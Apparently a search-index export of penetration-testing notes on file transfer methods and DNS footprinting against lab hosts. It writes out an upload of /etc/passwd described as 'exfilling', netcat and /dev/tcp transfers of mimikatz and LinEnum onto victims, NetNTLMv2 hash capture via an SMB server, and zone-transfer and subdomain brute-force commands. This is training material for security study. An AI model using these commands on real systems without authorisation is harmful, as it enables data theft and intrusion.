/etc/nginx/sites-enabled/ Start nginx hrmns@htb[/htb]$ sudo systemctl restart nginx.service If we get any error messages, be sure to check /var/log/nginx/error.log root@localhost# tail -2 ` /var/log/nginx/error.log ` 2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`) 2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind() root@localhost# : ss -lnpt | grep ` 80 ` LISTEN 0 100 0.0.0.0:80 0.0.0.0:* users:((\"python\",pid=`2811`,fd=3),(\"python\",pid=2070,fd=3),(\"python\",pid=1968,fd=3),(\"python\",pid=1856,fd=3)) root@localhost# : ps -ef | grep ` 2811 ` user65 2811 1856 0 16:05 ? 00:00:04 `python -m websockify 80 localhost:5901 -D` root 6720 2226 0 16:14 pts/0 00:00:00 grep --color=auto 2811 6. We see there is already a module listening on port 80. To get around this, we can remove the default NGINX Configuration which binds on port 80. hrmns@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default Test upload by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt root@localhost# curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt root@localhost# tail -1 /var/www/upload/SecretUploadDirectory/users.txt user65:x:1000:1000:,,,:/home/user65:/bin/bash Once we have this working, a good test is to make sure \"File Listings\" is not available by navigating to \"http://localhost/SecretUploadDirectory\". By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most of the files are sensitive by nature, and we want to do our best to hide them. Thanks to NGINX being minimal, features like that are not enabled by default.","title":"Nginx Enable PUT"},{"location":"file_transfers/methods/#smb","text":"","title":"SMB"},{"location":"file_transfers/methods/#impacket-smbserver","text":"Impacket is my preferred method of setting up a file transfer over SMB because it does not run in the background or involve modifying configuration files. We can use smbserver.py specifically. If other people attempt to connect to the service, it has the bonus that it will display a NetNTLMv2 hash that, if successfully cracked, will reveal the password. Impacket SMBServer - Syntax hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <location> Always to have a separate order for file transfers to prevent unauthorized persons from gaining access to our local data. If we would use our home directory to transfer the desired data and an unauthorized person accesses it, he will be able to navigate to the \".ssh\" directory and find the SSH keys, which can be used against us. hrmns@htb[/htb]$ mkdir Transfers && cd Transfers hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support FileTransfer $( pwd ) To verify the share was created and accessible, we can run: hrmns@htb[/htb]$ sudo smbclient -L 127 .0.0.1 Enter WORKGROUP\\root's password: Sharename Type Comment --------- ---- ------- IPC$ Disk FileTransfer Disk SMB1 disabled -- no workgroup available Going to our Impacket terminal, we can see the connection and if we had not known the user's password before. We could use the line under \"Authenticated Successfully\" to Hashcat and attempt to crack it. Impacket SMBServer - Listening [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (127.0.0.1,38928) [*] AUTHENTICATE_MESSAGE (WORKGROUP\\root,PARROT) [*] User PARROT\\root authenticated successfully [*] root::WORKGROUP:4141414141414141:926ebbd136be706117721fbcad821410:01010000000000008039147afabcd601a3099ada8208fd2c00000000010010004a006e00640046006700460075007000030010004a006e0064004600670046007500700002001000640062005a0054005300490054004b0004001000640062005a0054005300490054004b00070008008039147afabcd6010600040002000000080030003000000000000000000000000000000054af210c79b6f4bd986d404d7769e730cecdf6b2feec6c6d5cd8a765d98034bb0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e00310000000000 [*] Connecting Share(1:IPC$) [*] NetrShareEnum Level: 1 [*] Disconnecting Share(1:IPC$) [*] Closing down connection (127.0.0.1,38928) [*] Remaining connections [] In some cases, computers will not allow anonymous SMB connections. In this case, we may want to use the user/password flags to allow authentication on our SMB server. This can be done with the following command: hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -user USERNAME -password PASSWORD FileTransfer $( pwd )","title":"Impacket SMBServer"},{"location":"file_transfers/methods/#miscellaneous-file-transfer-methods","text":"","title":"Miscellaneous File Transfer Methods"},{"location":"file_transfers/methods/#web-servers","text":"A compromised Linux machine may not have a web server installed or access to the Internet, so a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed. Python2 hrmns@htb[/htb]$ python -m SimpleHTTPServer 8080 Python3 hrmns@htb[/htb]$ python3 -m http.server 8080 Ruby hrmns@htb[/htb]$ ruby -run -ehttpd . -p8080 PHP hrmns@htb[/htb]$ php -S 0 .0.0.0:8080 Socat hrmns@htb[/htb]$ socat TCP-LISTEN:8080,reuseaddr,fork With administrative access to a Windows machine, IIS can be easily installed. PS C:\\htb> Add-WindowsFeature Web-Server, Web-Mgmt-Tools","title":"Web Servers"},{"location":"file_transfers/methods/#smb-webdav","text":"SMB is a good option for file transfers, as on Windows as you don\u2019t need to install anything. SMB traffic features prominently on networks, and SMB file transfers to Windows computers are expected. Unfortunately, it\u2019s also the case that outbound SMB traffic is often allowed through the external firewall. In case SMB traffic through the firewall has been restricted, WebDAV may be a good option, as it relies on HTTP as a transport protocol. Some common tools that support file transfers from SMB and WebDAV shares are reviewed below.","title":"SMB / WebDAV"},{"location":"file_transfers/methods/#powershell","text":"Copy-Item PS C:\\htb> Copy-Item -Path C:\\Temp\\nc.exe -Destination C:\\Temp\\nc.exe -ToSession $session Set-Content PS C:\\htb> $file = Get-Content C:\\Temp\\nc.exe -Raw PS C:\\htb> Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\\Temp\\nc.exe -value $using:file} Copy / xcopy / robocopy PS C:\\htb> xcopy \\\\10.10.10.132\\share\\nc.exe nc.exe PS C:\\htb> copy C:\\Temp\\nc.exe \\\\10.10.10.132\\c$\\Temp\\nc.exe Map / Mount Drives PS C:\\htb> net use Q: \\\\10.10.10.132\\share PS C:\\htb> pushd \\\\10.10.10.132\\share PS C:\\htb> mklink /D share \\\\10.10.10.132\\share hrmns@htb[/htb]$ smbclient //10.10.10.132/share -U username -W domain","title":"PowerShell"},{"location":"file_transfers/methods/#netcat","text":"The target or attacking machine can be used to initiate the connection, which is useful if a firewall prevents access to the target. Connection Initiated by Pentester victim@target:~$ nc -nlvp 8000 > mimikatz.exe hrmns@htb[/htb]$ nc -nv 10 .10.10.132 8000 <mimikatz.exe Connection Initiated by Target hrmns@htb[/htb]$ nc -nv 10 .10.10.32 8000 > mimikatz.exe victim@target:~$ nc -nlvp 8000 <mimikatz.exe Netcat can also serve content for transfer by the /dev/tcp device file. Start nc listener hrmns@htb[/htb]$ nc -lvnp 80 <LinEnum.sh Dl the file victim@target:~$ cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh","title":"Netcat"},{"location":"file_transfers/methods/#scp","text":"SCP Upload PS C:\\htb> scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip SCP Download hrmns@htb[/htb]$ scp user@target:/tmp/mimikatz.exe C: \\T emp \\m imikatz.exe","title":"SCP"},{"location":"file_transfers/methods/#ftp","text":"Windows 10 includes a native FTP client, which can also read commands from a script to work in a non-interactive shell. Ftp-script.txt open 10.10.10.32 anonymous anonymous lcd C:\\Temp get nc.exe quit PS C:\\htb> ftp -s:ftp-script.txt","title":"FTP"},{"location":"file_transfers/methods/#tftp","text":"The TFTP client is not available by default in Windows, but it can be enabled using DISM. \\ PS C:\\htb> DISM /online /Enable-Feature /FeatureName:TFTP In newer versions of Windows, the Install-WindowsFeature PowerShell cmdlet can also be used. Both DISM and Install-WindowsFeature require administrative access. PS C:\\htb> Install-WindowsFeature TFTP-Client","title":"TFTP"},{"location":"file_transfers/methods/#rdp","text":"emote Desktop is often enabled on Windows machines, and from Linux, rdesktop can be used to expose a local folder in the remote RDP session. hrmns@htb[/htb]$ rdesktop 10 .10.10.132 -r disk:linux = '/home/user/rdesktop/files' Alternatively, from Windows, the native mstsc.exe remote desktop client can be used. After selecting the drive, we can interact with it in the remote session PS C:\\htb> copy \\\\tsclient\\c\\temp\\mimikatz.exe . This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.","title":"RDP"},{"location":"footprinting/dns/","text":"Server Type Description DNS Root Server The root servers of the DNS are responsible for the top-level domains ( TLD ). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers ( ICANN ) coordinates the work of the root name servers. There are 13 such root servers around the globe. Authoritative Nameserver Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Non-authoritative Nameserver Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying. Caching DNS Server Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage. Forwarding Server Forwarding servers perform only one function: they forward DNS queries to another DNS server. Resolver Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router. DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply DNS over TLS ( DoT ) or DNS over HTTPS ( DoH ) here. In addition, the network protocol NSCrypt also encrypts the traffic between the computer and the name server. Default Configuration \u00b6 The DNS server Bind9 is very often used on Linux-based distributions. Local DNS Configuration root@bind9:~# cat /etc/bind/named.conf.local // // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \"/etc/bind/zones.rfc1918\"; zone \"domain.com\" { type master; file \"/etc/bind/db.domain.com\"; allow-update { key rndc-key; }; }; In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. Zone Files root@bind9:~# cat /etc/bind/db.domain.com ; ; BIND reverse data file for local loopback interface ; $ ORIGIN domain.com $ TTL 86400 @ IN SOA dns1.domain.com. hostmaster.domain.com. ( 2001062501 ; serial 21600 ; refresh after 6 hours 3600 ; retry after 1 hour 604800 ; expire after 1 week 86400 ) ; minimum TTL of 1 day IN NS ns1.domain.com. IN NS ns2.domain.com. IN MX 10 mx.domain.com. IN MX 20 mx2.domain.com. IN A 10.129.14.5 server1 IN A 10.129.14.5 server2 IN A 10.129.14.7 ns1 IN A 10.129.14.2 ns2 IN A 10.129.14.3 ftp IN CNAME server1 mx IN CNAME server1 mx2 IN CNAME server2 www IN CNAME server2 For the IP address to be resolved from the Fully Qualified Domain Name ( FQDN ), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table. Reverse Name Resolution Zone Files root@bind9:~# cat /etc/bind/db.10.129.14 ; ; BIND reverse data file for local loopback interface ; $ ORIGIN 14 .129.10.in-addr.arpa $ TTL 86400 @ IN SOA dns1.domain.com. hostmaster.domain.com. ( 2001062501 ; serial 21600 ; refresh after 6 hours 3600 ; retry after 1 hour 604800 ; expire after 1 week 86400 ) ; minimum TTL of 1 day IN NS ns1.domain.com. IN NS ns2.domain.com. 5 IN PTR server1.domain.com. 7 IN MX mx.domain.com. ...SNIP... Dangerous Settings \u00b6 List of vulnerabilities targeting BIND9 server: CVEdetails Most popular attacks on DNS server: SecurityTrails Option Description allow-query Defines which hosts are allowed to send requests to the DNS server. allow-recursion Defines which hosts are allowed to send recursive requests to the DNS server. allow-transfer Defines which hosts are allowed to receive zone transfers from the DNS server. zone-statistics Collects statistical data of zones. Footprinting the Service \u00b6 Query DNS server if other name servers are known hrmns@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> ns inlanefreight.htb @10.129.14.128 ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45010 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good) ;; QUESTION SECTION: ;inlanefreight.htb. IN NS ;; ANSWER SECTION: inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. ;; ADDITIONAL SECTION: ns.inlanefreight.htb. 604800 IN A 10.129.34.136 ;; Query time: 0 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:04:03 CEST 2021 ;; MSG SIZE rcvd: 107 use any to view all available records hrmns@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.htb @10.129.14.128 ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7649 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good) ;; QUESTION SECTION: ;inlanefreight.htb. IN ANY ;; ANSWER SECTION: inlanefreight.htb. 604800 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\" inlanefreight.htb. 604800 IN TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\" inlanefreight.htb. 604800 IN TXT \"MS=ms97310371\" inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. ;; ADDITIONAL SECTION: ns.inlanefreight.htb. 604800 IN A 10.129.34.136 ;; Query time: 0 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:42:13 CEST 2021 ;; MSG SIZE rcvd: 437 DIG - AXFR Zone Transfer hrmns@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> axfr inlanefreight.htb @10.129.14.128 ;; global options: +cmd inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 inlanefreight.htb. 604800 IN TXT \"MS=ms97310371\" inlanefreight.htb. 604800 IN TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\" inlanefreight.htb. 604800 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\" inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. app.inlanefreight.htb. 604800 IN A 10.129.18.15 internal.inlanefreight.htb. 604800 IN A 10.129.1.6 mail1.inlanefreight.htb. 604800 IN A 10.129.18.201 ns.inlanefreight.htb. 604800 IN A 10.129.34.136 inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 ;; Query time: 4 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:51:19 CEST 2021 ;; XFR size: 9 records (messages 1, bytes 520) DIG - AXFR Zone Transfer - Internal hrmns@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> axfr internal.inlanefreight.htb @10.129.14.128 ;; global options: +cmd internal.inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 internal.inlanefreight.htb. 604800 IN TXT \"MS=ms97310371\" internal.inlanefreight.htb. 604800 IN TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\" internal.inlanefreight.htb. 604800 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\" internal.inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. dc1.internal.inlanefreight.htb. 604800 IN A 10.129.34.16 dc2.internal.inlanefreight.htb. 604800 IN A 10.129.34.11 mail1.internal.inlanefreight.htb. 604800 IN A 10.129.18.200 ns.internal.inlanefreight.htb. 604800 IN A 10.129.34.136 vpn.internal.inlanefreight.htb. 604800 IN A 10.129.1.6 ws1.internal.inlanefreight.htb. 604800 IN A 10.129.1.34 ws2.internal.inlanefreight.htb. 604800 IN A 10.129.1.35 wsus.internal.inlanefreight.htb. 604800 IN A 10.129.18.2 internal.inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 ;; Query time: 0 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:53:11 CEST 2021 ;; XFR size: 15 records (messages 1, bytes 664) The individual A records with the hostnames can also be found out with the help of a brute-force attack. hrmns@htb[/htb]$ for sub in $( cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt ) ; do dig $sub .inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt ; done ns.inlanefreight.htb. 604800 IN A 10.129.34.136 mail1.inlanefreight.htb. 604800 IN A 10.129.18.201 app.inlanefreight.htb. 604800 IN A 10.129.18.15 Using DNSenum hrmns@htb[/htb]$ dnsenum --dnsserver 10 .129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb dnsenum VERSION:1.2.6 ----- inlanefreight.htb ----- Host's addresses: __________________ Name Servers: ______________ ns.inlanefreight.htb. 604800 IN A 10.129.34.136 Mail (MX) Servers: ___________________ Trying Zone Transfers and getting Bind Versions: _________________________________________________ unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1. Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ... AXFR record query failed: no nameservers Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt: _______________________________________________________________________________________________________ ns.inlanefreight.htb. 604800 IN A 10.129.34.136 mail1.inlanefreight.htb. 604800 IN A 10.129.18.201 app.inlanefreight.htb. 604800 IN A 10.129.18.15 ns.inlanefreight.htb. 604800 IN A 10.129.34.136 ...SNIP... done.","title":"DNS"},{"location":"footprinting/dns/#default-configuration","text":"The DNS server Bind9 is very often used on Linux-based distributions. Local DNS Configuration root@bind9:~# cat /etc/bind/named.conf.local // // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \"/etc/bind/zones.rfc1918\"; zone \"domain.com\" { type master; file \"/etc/bind/db.domain.com\"; allow-update { key rndc-key; }; }; In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. Zone Files root@bind9:~# cat /etc/bind/db.domain.com ; ; BIND reverse data file for local loopback interface ; $ ORIGIN domain.com $ TTL 86400 @ IN SOA dns1.domain.com. hostmaster.domain.com. ( 2001062501 ; serial 21600 ; refresh after 6 hours 3600 ; retry after 1 hour 604800 ; expire after 1 week 86400 ) ; minimum TTL of 1 day IN NS ns1.domain.com. IN NS ns2.domain.com. IN MX 10 mx.domain.com. IN MX 20 mx2.domain.com. IN A 10.129.14.5 server1 IN A 10.129.14.5 server2 IN A 10.129.14.7 ns1 IN A 10.129.14.2 ns2 IN A 10.129.14.3 ftp IN CNAME server1 mx IN CNAME server1 mx2 IN CNAME server2 www IN CNAME server2 For the IP address to be resolved from the Fully Qualified Domain Name ( FQDN ), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table. Reverse Name Resolution Zone Files root@bind9:~# cat /etc/bind/db.10.129.14 ; ; BIND reverse data file for local loopback interface ; $ ORIGIN 14 .129.10.in-addr.arpa $ TTL 86400 @ IN SOA dns1.domain.com. hostmaster.domain.com. ( 2001062501 ; serial 21600 ; refresh after 6 hours 3600 ; retry after 1 hour 604800 ; expire after 1 week 86400 ) ; minimum TTL of 1 day IN NS ns1.domain.com. IN NS ns2.domain.com. 5 IN PTR server1.domain.com. 7 IN MX mx.domain.com. ...SNIP...","title":"Default Configuration"},{"location":"footprinting/dns/#dangerous-settings","text":"List of vulnerabilities targeting BIND9 server: CVEdetails Most popular attacks on DNS server: SecurityTrails Option Description allow-query Defines which hosts are allowed to send requests to the DNS server. allow-recursion Defines which hosts are allowed to send recursive requests to the DNS server. allow-transfer Defines which hosts are allowed to receive zone transfers from the DNS server. zone-statistics Collects statistical data of zones.","title":"Dangerous Settings"},{"location":"footprinting/dns/#footprinting-the-service","text":"Query DNS server if other name servers are known hrmns@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> ns inlanefreight.htb @10.129.14.128 ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45010 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good) ;; QUESTION SECTION: ;inlanefreight.htb. IN NS ;; ANSWER SECTION: inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. ;; ADDITIONAL SECTION: ns.inlanefreight.htb. 604800 IN A 10.129.34.136 ;; Query time: 0 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:04:03 CEST 2021 ;; MSG SIZE rcvd: 107 use any to view all available records hrmns@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.htb @10.129.14.128 ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7649 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good) ;; QUESTION SECTION: ;inlanefreight.htb. IN ANY ;; ANSWER SECTION: inlanefreight.htb. 604800 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\" inlanefreight.htb. 604800 IN TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\" inlanefreight.htb. 604800 IN TXT \"MS=ms97310371\" inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. ;; ADDITIONAL SECTION: ns.inlanefreight.htb. 604800 IN A 10.129.34.136 ;; Query time: 0 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:42:13 CEST 2021 ;; MSG SIZE rcvd: 437 DIG - AXFR Zone Transfer hrmns@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> axfr inlanefreight.htb @10.129.14.128 ;; global options: +cmd inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 inlanefreight.htb. 604800 IN TXT \"MS=ms97310371\" inlanefreight.htb. 604800 IN TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\" inlanefreight.htb. 604800 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\" inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. app.inlanefreight.htb. 604800 IN A 10.129.18.15 internal.inlanefreight.htb. 604800 IN A 10.129.1.6 mail1.inlanefreight.htb. 604800 IN A 10.129.18.201 ns.inlanefreight.htb. 604800 IN A 10.129.34.136 inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 ;; Query time: 4 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:51:19 CEST 2021 ;; XFR size: 9 records (messages 1, bytes 520) DIG - AXFR Zone Transfer - Internal hrmns@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128 ; <<>> DiG 9.16.1-Ubuntu <<>> axfr internal.inlanefreight.htb @10.129.14.128 ;; global options: +cmd internal.inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 internal.inlanefreight.htb. 604800 IN TXT \"MS=ms97310371\" internal.inlanefreight.htb. 604800 IN TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\" internal.inlanefreight.htb. 604800 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\" internal.inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb. dc1.internal.inlanefreight.htb. 604800 IN A 10.129.34.16 dc2.internal.inlanefreight.htb. 604800 IN A 10.129.34.11 mail1.internal.inlanefreight.htb. 604800 IN A 10.129.18.200 ns.internal.inlanefreight.htb. 604800 IN A 10.129.34.136 vpn.internal.inlanefreight.htb. 604800 IN A 10.129.1.6 ws1.internal.inlanefreight.htb. 604800 IN A 10.129.1.34 ws2.internal.inlanefreight.htb. 604800 IN A 10.129.1.35 wsus.internal.inlanefreight.htb. 604800 IN A 10.129.18.2 internal.inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800 ;; Query time: 0 msec ;; SERVER: 10.129.14.128#53(10.129.14.128) ;; WHEN: So Sep 19 18:53:11 CEST 2021 ;; XFR size: 15 records (messages 1, bytes 664) The individual A records with the hostnames can also be found out with the help of a brute-force attack. hrmns@htb[/htb]$ for sub in $( cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt ) ; do dig $sub .inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt ; done ns.inlanefreight.htb. 604800 IN A 10.129.34.136 mail1.inlanefreight.htb. 604800 IN A 10.129.18.201 app.inlanefreight.htb. 604800 IN A 10.129.18.15 Using DNSenum hrmns@htb[/htb]$ dnsenum --dnsserver 10 .129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb dnsenum VERSION:1.2.6 ----- inlanefreight.htb ----- Host's addresses: __________________ Name Servers: ______________ ns.inlanefreight.htb. 604800 IN A 10.129.34.136 Mail (MX) Servers: ___________________ Trying Zone Transfers and getting Bind Versions: _________________________________________________ unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1. Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ... AXFR record query failed: no nameservers Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt: _______________________________________________________________________________________________________ ns.inlanefreight.htb. 604800 IN A 10.129.34.136 mail1.inlanefreight.htb. 604800 IN A 10.129.18.201 app.inlanefreight.htb. 604800 IN A 10.129.18.15 ns.inlanefreight.htb. 604800 IN A 10.129.34.136 ...SNIP... done.","title":"Footprinting the Service"},{"location":"footprinting/domain_information/","text":"Online Presence \u00b6 Source to find more subdomains: crt.sh Output results in JSON format Certificate Transparency hrmns@htb[/htb]$ curl -s https://crt.sh/ \\? q \\= inlanefreight.com \\& output \\= json | jq . [ { \"issuer_ca_id\": 23451835427, \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\", \"common_name\": \"matomo.inlanefreight.com\", \"name_value\": \"matomo.inlanefreight.com\", \"id\": 50815783237226155, \"entry_timestamp\": \"2021-08-21T06:00:17.173\", \"not_before\": \"2021-08-21T05:00:16\", \"not_after\": \"2021-11-19T05:00:15\", \"serial_number\": \"03abe9017d6de5eda90\" }, { \"issuer_ca_id\": 6864563267, \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\", \"common_name\": \"matomo.inlanefreight.com\", \"name_value\": \"matomo.inlanefreight.com\", \"id\": 5081529377, \"entry_timestamp\": \"2021-08-21T06:00:16.932\", \"not_before\": \"2021-08-21T05:00:16\", \"not_after\": \"2021-11-19T05:00:15\", \"serial_number\": \"03abe90104e271c98a90\" }, { ... SNIP ... Filtered by the unique subdomains: hrmns@htb[/htb]$ curl -s https://crt.sh/ \\? q \\= inlanefreight.com \\& output \\= json | jq . | grep name | cut -d \":\" -f2 | grep -v \"CN=\" | cut -d '\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u account.ttn.inlanefreight.com blog.inlanefreight.com bots.inlanefreight.com console.ttn.inlanefreight.com ct.inlanefreight.com data.ttn.inlanefreight.com *.inlanefreight.com inlanefreight.com integrations.ttn.inlanefreight.com iot.inlanefreight.com mails.inlanefreight.com 